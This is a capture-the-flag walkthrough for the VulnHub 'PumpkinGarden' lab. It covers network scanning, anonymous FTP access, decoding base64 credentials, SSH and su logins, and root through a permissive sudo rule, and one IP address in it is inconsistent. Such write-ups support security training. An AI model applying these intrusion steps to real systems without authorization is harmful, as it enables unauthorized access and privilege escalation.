# PumpkinGarden

## 1.Enumeration

```bash
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:0f	(Unknown: locally administered)
192.168.56.116	08:00:27:20:a9:84	PCS Systemtechnik GmbH
192.168.56.100	08:00:27:a0:61:e0	PCS Systemtechnik GmbH
```
The ip address is `192.168.56.100`, let's scan it :

```bash
root@kali: nmap -sV -sC -v -p21,1515,3535 -oN nmap.out 192.168.56.116

Nmap scan report for 192.168.56.116
Host is up (0.00043s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
1515/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Mission-Pumpkin
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d8:8d:e7:48:3a:3c:91:0e:3f:43:ea:a3:05:d8:89:e2 (DSA)
|   2048 f0:41:8f:e0:40:e3:c0:3a:1f:4d:4f:93:e6:63:24:9e (RSA)
|   256 fa:87:57:1b:a2:ba:92:76:0c:e7:85:e7:f5:3d:54:b1 (ECDSA)
|_  256 fa:e8:42:5a:88:91:b4:4b:eb:e4:c3:74:2e:23:a5:45 (ED25519)
MAC Address: 08:00:27:20:A9:84 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

on port `21` we have anonymous access :

```bash
root@kali: ftp 192.168.56.116

Connected to 192.168.56.116.
220 Welcome to Pumpkin's FTP service.
Name (192.168.56.116:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir
229 Entering Extended Passive Mode (|||17078|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
226 Directory send OK.

ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||30226|).
150 Opening BINARY mode data connection for note.txt (88 bytes).
100% |********************************************************************************************************************|    88        6.15 KiB/s    00:00 ETA
226 Transfer complete.
```

inside of note.txt is :

```text
root@kali: cat note.txt 
Hello Dear! 
Looking for route map to PumpkinGarden? I think jack can help you find it.
```

i first thaught `jack` if one of the users but then i checked the web page on port `1515` and in the page source there was a comment :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f584a048-fe2c-4f18-aa02-a821505e5c2f)

then i checked the `/img` directory and found `hidden_secret`, inside there is a `clue.txt` which contains a base64 string :

```bash
root@kali: echo -n 'c2NhcmVjcm93IDogNVFuQCR5' | base64 -d
scarecrow : 5Qn@$y
```

## 2.Gaining Shell

Now connect to ssh using credentials found in clue.txt

```bash
root@kali: ssh -p 3535 scarecrow@192.168.56.116
------------------------------------------------------------------------------
			  Welcome to Mission-Pumpkin
      All remote connections to this machine are monitored and recorded
------------------------------------------------------------------------------
scarecrow@192.168.56.116's password: 
Last login: Thu Jun 13 00:35:51 2019 from 192.168.1.106
scarecrow@Pumpkin:~$ 
scarecrow@Pumpkin:~$ 
scarecrow@Pumpkin:~$ id
uid=1001(scarecrow) gid=1001(scarecrow) groups=1001(scarecrow)
```

there is a note.txt in home folder inside of it :

```bash
Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
```

check out the /etc/passwd and see there is a user called `goblin`, change your user to this account using the credential found in note.txt

```bash
scarecrow@Pumpkin:~$ su goblin
Password: 
goblin@Pumpkin:/home/scarecrow$ id
uid=1002(goblin) gid=1002(goblin) groups=1002(goblin),27(sudo)
```

just check the `sudo -l` and it contains :

```text
atching Defaults entries for goblin on Pumpkin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goblin may run the following commands on Pumpkin:
    (root) ALL, !/bin/su
```

## 3.Privilege Escalation

Simply type this :

```bash
goblin@Pumpkin:/home/scarecrow$ sudo /bin/bash

root@Pumpkin:/root# cat PumpkinGarden_Key 
Q29uZ3JhdHVsYXRpb25zIQ==
```

```bash
root@kali: echo -n 'Q29uZ3JhdHVsYXRpb25zIQ==' | base64 -d
Congratulations! 
```

this is how you can get root on this machine :)











